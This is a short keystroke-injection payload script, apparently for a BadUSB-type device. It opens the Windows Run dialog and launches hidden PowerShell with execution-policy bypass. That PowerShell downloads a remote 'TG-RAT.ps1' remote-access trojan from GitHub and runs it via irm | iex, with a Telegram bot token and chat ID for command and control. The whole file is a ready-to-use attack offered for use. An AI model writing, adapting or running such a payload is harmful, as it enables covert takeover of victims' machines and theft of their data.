
// Replace BOT_TOKEN and CHAT_ID before running!

// script setup
layout("us")

// Open Powershell as Admin
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $tg='BOT_TOKEN';$cid='CHAT_ID'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-RAT.ps1 | iex");
delay(500);
press("ENTER");
